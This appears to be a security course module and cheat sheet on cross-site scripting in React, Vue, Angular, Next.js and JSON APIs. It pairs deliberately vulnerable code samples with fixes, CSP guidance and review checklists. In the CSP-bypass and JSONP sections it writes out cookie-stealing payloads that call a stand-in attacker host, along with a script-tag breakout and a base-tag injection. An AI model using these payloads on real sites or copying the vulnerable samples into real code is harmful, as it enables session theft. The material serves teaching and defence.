# Module 6 — XSS in Modern Apps & APIs: Cheat Sheet & Field Reference

> **Scope:** Ethical hacking · Bug bounty · Secure coding · Defensive understanding  
> **Level:** Advanced  
> **Date:** 2026-05

---

## 1. The Mental Shift

```
Old model:  Server builds HTML → browser renders it
            XSS lives in server-side templates

New model:  Server sends JSON → JavaScript builds the DOM
            XSS lives in client-side rendering code
            Frameworks help — but only in specific places
```

Every modern framework has two paths:
- **Safe path** — auto-escapes by default
- **Escape hatch** — bypasses escaping for "legitimate" HTML rendering

XSS in modern apps almost always lives in escape hatches, href/src sinks, or SSR boundaries.

---

## 2. Framework Vulnerability Map

| Framework | Safe path | Escape hatch (dangerous) |
|---|---|---|
| React | `{userInput}` | `dangerouslySetInnerHTML` |
| Vue | `{{ userInput }}` | `v-html` |
| Angular | `{{ userInput }}` | `bypassSecurityTrust*` |
| Next.js (SSR) | Framework-managed props | `dangerouslySetInnerHTML` in SSR + `__NEXT_DATA__` injection |
| Django templates | `{{ var }}` | `mark_safe()` / `\| safe` filter |
| Jinja2 | `{{ var }}` | `Markup()` / `\| safe` |
| EJS | `<%= var %>` | `<%- var %>` |

**Universal failure point across all frameworks:** `href` and `src` attributes receiving user-controlled URLs. None validate `javascript:` URIs by default.

---

## 3. React — All Four Failure Points

### Failure point 1 — `dangerouslySetInnerHTML`
```jsx
// VULNERABLE
<div dangerouslySetInnerHTML={{ __html: profile.bio }} />

// FIXED — DOMPurify with explicit allowlist
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(profile.bio, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['href'],
    ALLOWED_URI_REGEXP: /^https?:\/\//i
  })
}} />

// BEST — use default interpolation if HTML formatting is not required
<div>{profile.bio}</div>
```

### Failure point 2 — `href` / `src` with user-controlled URLs
```jsx
// VULNERABLE — javascript: URI executes on click
<a href={profile.website}>Visit</a>

// FIXED — validate scheme before rendering
const safeUrl = /^https?:\/\//i.test(profile.website)
  ? profile.website : '#';
<a href={safeUrl} rel="noopener noreferrer">Visit</a>
```

### Failure point 3 — `<script dangerouslySetInnerHTML>`
```jsx
// VULNERABLE — equivalent to eval() on stored user data
<script dangerouslySetInnerHTML={{ __html: profile.embedCode }} />

// FIXED — remove entirely. No safe version exists for user-supplied JS.
// If embed functionality needed, use a sandboxed iframe:
<iframe
  src={`/embed/${encodeURIComponent(userId)}`}
  sandbox="allow-scripts"
  title="User embed"
/>
```

### Failure point 4 — SSR data injection (Next.js)
```html
<!-- Next.js injects server state into HTML -->
<script id="__NEXT_DATA__" type="application/json">
  {"props":{"pageProps":{"username":"USER_INPUT"}}}
</script>

<!-- If USER_INPUT = </script><script>alert(1) -->
<!-- HTML parser exits the block and executes injected script -->

<!-- Next.js modern versions escape this correctly:
     </script> → \u003c/script\u003e
     Always use framework-managed data passing — never manual injection -->
```

---

## 4. Vue — Vulnerability Patterns

```vue
<!-- SAFE — auto-escaped -->
<template>
  <div>{{ userComment }}</div>
</template>

<!-- VULNERABLE — raw HTML rendering -->
<template>
  <div v-html="userComment"></div>
</template>

<!-- FIXED — DOMPurify in computed property -->
<template>
  <div v-html="sanitizedComment"></div>
</template>

<script>
import DOMPurify from 'dompurify';
export default {
  computed: {
    sanitizedComment() {
      return DOMPurify.sanitize(this.userComment, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
        ALLOWED_ATTR: []
      });
    }
  }
}
</script>

<!-- URL sink — same problem as React -->
<!-- VULNERABLE -->
<a :href="userUrl">Link</a>

<!-- FIXED -->
<a :href="/^https?:\/\//i.test(userUrl) ? userUrl : '#'">Link</a>
```

---

## 5. Angular — The `bypassSecurityTrust*` Family

Angular sanitizes HTML, URLs, and styles by default via `DomSanitizer`. XSS lives in explicit bypass calls:

```typescript
// These are the methods to look for in code reviews
// Any of them called with user-controlled input = critical finding

bypassSecurityTrustHtml(userInput)         // bypasses HTML sanitization
bypassSecurityTrustScript(userInput)       // bypasses script sanitization
bypassSecurityTrustStyle(userInput)        // bypasses CSS sanitization
bypassSecurityTrustUrl(userInput)          // bypasses URL sanitization
bypassSecurityTrustResourceUrl(userInput)  // bypasses resource URL sanitization

// VULNERABLE — developer bypasses sanitization on user-controlled data
constructor(private sanitizer: DomSanitizer) {
  this.trustedContent = this.sanitizer.bypassSecurityTrustHtml(
    userControlledInput  // attacker controls this
  );
}

// FIXED — use Angular's built-in sanitization (the default)
// If [innerHTML] binding is needed, Angular sanitizes automatically:
// <div [innerHTML]="userContent"></div>  ← safe, Angular sanitizes
```

---

## 6. JSON APIs and Client-Side Rendering

The XSS risk moved from server templates to frontend rendering code.

```
Server renders HTML:   Server encodes → browser displays
SPA with JSON API:     Server sends raw data → JS renders to DOM → XSS lives here
```

### Vulnerable pattern
```javascript
// API returns unsanitized stored content
app.get('/api/user/:id', (req, res) => {
  const user = db.getUserById(req.params.id);
  res.json(user);  // user.bio contains <script>alert(1)</script>
});

// Frontend renders it unsafely
fetch('/api/user/123')
  .then(r => r.json())
  .then(user => {
    document.getElementById('bio').innerHTML = user.bio;  // VULNERABLE
  });
```

### Full secure chain
```javascript
// API layer — sanitize before sending (first defense layer)
app.get('/api/user/:id', (req, res) => {
  if (!/^\d+$/.test(req.params.id)) {
    return res.status(400).json({ error: 'Invalid ID' });
  }

  const user = db.getUserById(req.params.id);
  res.set('Content-Type', 'application/json');
  res.json({
    ...user,
    bio: DOMPurify.sanitize(user.bio, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
      ALLOWED_URI_REGEXP: /^https?:\/\//i
    })
  });
});

// Frontend — safe sink (second defense layer)
fetch('/api/user/123')
  .then(r => r.json())
  .then(user => {
    // If plain text — textContent, never innerHTML
    document.getElementById('bio').textContent = user.bio;

    // If formatted HTML genuinely needed — DOMPurify again at render
    document.getElementById('bio').innerHTML =
      DOMPurify.sanitize(user.bio);
  });
```

**Key principle:** Defense at both layers. API sanitization protects non-browser consumers. Frontend sanitization protects against API compromise or misconfiguration. Neither alone is sufficient.

---

## 7. Content Security Policy — Complete Reference

### What CSP does
Tells the browser which resources it is allowed to load and execute. Does not prevent injection — limits what injected code can do.

### The nonce approach — gold standard
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-RANDOM_PER_REQUEST';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
```

```javascript
// Correct nonce implementation — crypto random per request
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}'; object-src 'none'`
  );
  next();
});

// In HTML template — nonce attribute on every legitimate script
// <script nonce="<%= nonce %>">...</script>
```

**Static nonce = no protection.** If the nonce is hardcoded, an attacker reads it from page source and reuses it in injected scripts. A nonce must be cryptographically random and unique per HTTP response.

### Six CSP misconfigurations — each bypassable

| Misconfiguration | Bypass |
|---|---|
| `'unsafe-inline'` | Any inline script executes — CSP useless |
| `'unsafe-eval'` | `eval(userInput)` executes freely |
| `*.trusted.com` wildcard | Attacker controls any subdomain → hosts script there |
| Large CDN allowlist (jsdelivr, unpkg, cdnjs) | Publish malicious npm package → load via whitelisted CDN |
| Missing `object-src` | Plugin-based script execution |
| Missing `base-uri` | `<base href="https://attacker.com">` redirects all relative URLs |

### Complete hardened CSP
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' data: https:;
  connect-src 'self' https://api.yoursite.com;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  require-trusted-types-for 'script'
```

---

## 8. CSP Bypass Techniques

### Technique 1 — JSONP endpoint as script gadget
```javascript
// Vulnerable JSONP endpoint on same origin
GET /api/data?callback=myFunction
Response: myFunction({"status":"ok"})  ← Content-Type: application/javascript

// CSP allows 'self' — attacker loads this via injected script tag
<script src="/api/data?callback=fetch('https://attacker.com/?c='+document.cookie)//"></script>

// CSP sees: <script src="/api/data?..."> loading from 'self' — ALLOWED
// Browser executes the response as JavaScript — payload runs
```

### Technique 2 — Whitelisted CDN abuse
```html
<!-- CSP: script-src cdn.jsdelivr.net -->
<!-- Attacker publishes package to npm, loads via jsdelivr -->
<script src="https://cdn.jsdelivr.net/npm/attacker-package@1.0.0/payload.js">
</script>
```

### Technique 3 — User upload as script gadget
```html
<!-- If SVG/JS uploads stored on same origin -->
<script src="/uploads/attacker-controlled.js"></script>
<!-- CSP sees 'self' load — allowed -->
```

### Technique 4 — Angular/React chunk files
```html
<!-- Framework chunk files are on 'self' and sometimes contain
     gadgets that can be abused with the right prototype pollution -->
```

### The fix for JSONP gadget — deprecate JSONP, use CORS
```javascript
// Replace JSONP with CORS — eliminates script gadget entirely
app.get('/api/data', (req, res) => {
  res.set('Access-Control-Allow-Origin', 'https://yourdomain.com');
  res.set('Content-Type', 'application/json');  // NOT application/javascript
  res.json({ status: 'ok', version: '2.1' });
});
// Content-Type: application/json — browser never executes as script
```

---

## 9. JSONP — Vulnerability and Fix

```javascript
// VULNERABLE — no callback validation
app.get('/api/data', (req, res) => {
  const callback = req.query.callback;
  res.set('Content-Type', 'application/javascript');
  res.send(`${callback}(${JSON.stringify(data)})`);
});

// Attack:
// GET /api/data?callback=fetch('https://attacker.com/?c='+document.cookie)//
// Response: fetch('https://attacker.com/?c='+document.cookie)//({"status":"ok"})

// FIXED — allowlist validation on callback name
app.get('/api/data', (req, res) => {
  const callback = req.query.callback;

  // Only valid JS identifier characters — rejects all injection attempts
  if (!callback || !/^[a-zA-Z_$][a-zA-Z0-9_$.]*$/.test(callback)) {
    return res.status(400).json({ error: 'Invalid callback' });
  }

  if (callback.length > 64) {
    return res.status(400).json({ error: 'Callback too long' });
  }

  res.set('Content-Type', 'application/javascript');
  res.send(`${callback}(${JSON.stringify(data)})`);
});

// BEST — deprecate JSONP entirely, use CORS
```

---

## 10. File Upload XSS

### Attack vectors
```
SVG upload    → inline SVG renders <script> in page origin → cookie theft
JS upload     → loaded via <script src> → CSP bypass if same origin
HTML upload   → opened directly → runs in upload origin
Filename XSS  → filename rendered in file manager without encoding
Path traversal → ../../public/index.html overwrites legitimate files
```

### Vulnerable upload endpoint
```javascript
app.post('/upload', upload.single('file'), (req, res) => {
  const filename = req.file.originalname;  // attacker-controlled
  const uploadPath = `/uploads/${filename}`;
  fs.renameSync(req.file.path, '.' + uploadPath);
  // Vulnerabilities: path traversal, XSS via SVG, no type validation
});
```

### Secure upload endpoint
```javascript
const ALLOWED_MIME = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
const ALLOWED_EXT  = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
// SVG excluded — serve from separate domain if required

app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });

  // Validate MIME type
  if (!ALLOWED_MIME.includes(req.file.mimetype)) {
    return res.status(400).json({ error: 'Type not allowed' });
  }

  // Validate extension
  const ext = path.extname(req.file.originalname).toLowerCase();
  if (!ALLOWED_EXT.includes(ext)) {
    return res.status(400).json({ error: 'Extension not allowed' });
  }

  // Generate random filename — never use user-supplied name
  const safeFilename = crypto.randomBytes(16).toString('hex') + ext;
  fs.renameSync(req.file.path, `./uploads/${safeFilename}`);

  res.set('X-Content-Type-Options', 'nosniff');
  res.json({ url: `/uploads/${safeFilename}` });
});
```

### SVG — serve from separate domain
```
profile-uploads.cdn.yoursite.com has no cookies for yoursite.com
Even if SVG script executes — document.cookie is empty
Origin isolation is defense in depth for upload XSS
```

---

## 11. Trusted Types — Browser-Native DOM XSS Defense

### The problem it solves
Dangerous sinks (`innerHTML`, `eval`, `location.href`) accept any string — the browser cannot distinguish a safe string from an attacker-controlled one. Trusted Types makes sinks reject plain strings entirely.

```http
Content-Security-Policy: require-trusted-types-for 'script'
```

```javascript
// BLOCKED — TypeError thrown
element.innerHTML = userInput;
// "Failed to set 'innerHTML': This document requires 'TrustedHTML' assignment"

// ALLOWED — TrustedHTML object from registered policy
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => {
    const url = new URL(input);
    if (url.hostname !== 'cdn.yoursite.com') throw new Error('Not allowed');
    return input;
  }
});

element.innerHTML = policy.createHTML(userInput);
// DOMPurify runs inside the policy — output is TrustedHTML object
// innerHTML accepts it
```

### What Trusted Types does not cover
```
eval() with string arg          → still dangerous
setTimeout(string)              → still dangerous
Third-party scripts loaded      → before policy applies
Prototype pollution             → overwrites policy methods
```

### Assessing apps with Trusted Types
```
No require-trusted-types-for header
  → All sinks accept raw strings
  → Standard DOM XSS methodology

require-trusted-types-for 'script' present
  → Look for:
     - Passthrough policy: createHTML: (s) => s  (policy exists but does nothing)
     - eval() sinks not covered by Trusted Types
     - Third-party scripts loaded before policy registration
     - Prototype pollution against trustedTypes.createPolicy
```

---

## 12. Full Hardened Backend — All Fixes Combined

```javascript
const express = require('express');
const crypto  = require('crypto');
const path    = require('path');
const DOMPurify = require('isomorphic-dompurify');
const app = express();

// Per-request nonce
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Hardened CSP
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    `script-src 'self' 'nonce-${res.locals.nonce}'`,
    `default-src 'self'`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `frame-ancestors 'none'`,
    `require-trusted-types-for 'script'`
  ].join('; '));
  next();
});

// API endpoint — validated ID, sanitized output
app.get('/api/user/:id', (req, res) => {
  if (!/^\d+$/.test(req.params.id))
    return res.status(400).json({ error: 'Invalid ID' });

  const user = db.getUserById(req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });

  res.set('Content-Type', 'application/json');
  res.json({
    ...user,
    bio: DOMPurify.sanitize(user.bio, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
      ALLOWED_ATTR: ['href'],
      ALLOWED_URI_REGEXP: /^https?:\/\//i
    })
  });
});

// JSONP replaced with CORS
app.get('/api/data', (req, res) => {
  res.set('Access-Control-Allow-Origin', 'https://yourdomain.com');
  res.set('Content-Type', 'application/json');
  res.json({ status: 'ok', version: '2.1' });
});

// Secure file upload
const ALLOWED_MIME = ['image/jpeg','image/png','image/gif','image/webp'];
const ALLOWED_EXT  = ['.jpg','.jpeg','.png','.gif','.webp'];

app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  if (!ALLOWED_MIME.includes(req.file.mimetype))
    return res.status(400).json({ error: 'Type not allowed' });

  const ext = path.extname(req.file.originalname).toLowerCase();
  if (!ALLOWED_EXT.includes(ext))
    return res.status(400).json({ error: 'Extension not allowed' });

  const safeFilename = crypto.randomBytes(16).toString('hex') + ext;
  fs.renameSync(req.file.path, `./uploads/${safeFilename}`);

  res.set('X-Content-Type-Options', 'nosniff');
  res.json({ url: `/uploads/${safeFilename}` });
});
```

---

## 13. Bug Bounty — What to Look for in Modern Apps

```
Code review checklist:
□ Search: dangerouslySetInnerHTML
□ Search: v-html
□ Search: bypassSecurityTrust
□ Search: innerHTML =
□ Search: eval(
□ Search: <%- (EJS raw output)
□ Search: | safe (Django/Jinja2 filter)
□ Search: mark_safe(
□ Check all href/src bindings receiving user data
□ Check CSP header — static nonce? unsafe-inline? large CDN allowlist?
□ Check for JSONP endpoints — /api/*?callback=
□ Check file upload endpoints — MIME validation? filename sanitization?
□ Check SVG upload handling — inline rendering? same origin?

Dynamic testing checklist:
□ Inject probe into every API-fed field
□ Test href/src attributes with javascript: URI
□ Test JSONP callback parameter
□ Check CSP header on responses — misconfigured?
□ Upload SVG with embedded script — does it execute?
□ Check __NEXT_DATA__ script tag in Next.js apps — is </script> escaped?
```

---

## 14. Severity Reference for Modern App XSS

| Finding | Severity | Why |
|---|---|---|
| `dangerouslySetInnerHTML` on stored user data | Critical | Stored XSS in React — no user interaction for victims |
| `<script dangerouslySetInnerHTML>` | Critical | Direct eval() equivalent on stored data |
| JSONP callback injection | Critical | Becomes CSP bypass — undermines security policy |
| `bypassSecurityTrust*` on user input (Angular) | Critical | Disables framework's primary XSS defense |
| `v-html` on stored user data | High | Stored XSS in Vue |
| `href` without scheme validation | Medium | Requires click — `javascript:` URI XSS |
| SVG upload inline rendering | High | Stored XSS via file upload |
| Static CSP nonce | High | Renders CSP bypass trivial |
| CDN whitelisted in CSP | Medium | Potential CSP bypass via script gadget |
| Missing `base-uri` in CSP | Medium | `<base>` tag injection redirects relative URLs |

---

## 15. Key Mental Models

> "Auto-escaping protects the safe path. It does nothing for escape hatches."

> "No framework validates javascript: URIs in href/src by default. Every framework is vulnerable to this."

> "A static CSP nonce is a password written on the door. It protects nothing."

> "A JSONP endpoint is a script gadget. Even after fixing the injection, it can be used to bypass CSP."

> "Content-Type: application/json cannot be executed as a script. Content-Type: application/javascript can. That difference is the entire JSONP fix."

> "Trusted Types makes dangerous sinks refuse plain strings. The defense moves from 'hope developers remember to sanitize' to 'the browser enforces sanitization'."

> "SVG is XML with native script support. Image upload = code upload if SVGs are allowed."

---

## 16. Coming Up — Module 7: Exploitation & Bug Bounty Methodology

- Chained XSS attacks — XSS + CSRF, XSS + privilege escalation
- Writing proper PoC payloads that demonstrate real impact
- Bug bounty report structure — what triagers need to see
- Impact assessment — from alert(1) to account takeover
- Real bug bounty finding walkthroughs
- Self-XSS and when it escalates to a real vulnerability
- Worm-able XSS — self-propagating payloads
- XSS to RCE — Electron app attack chains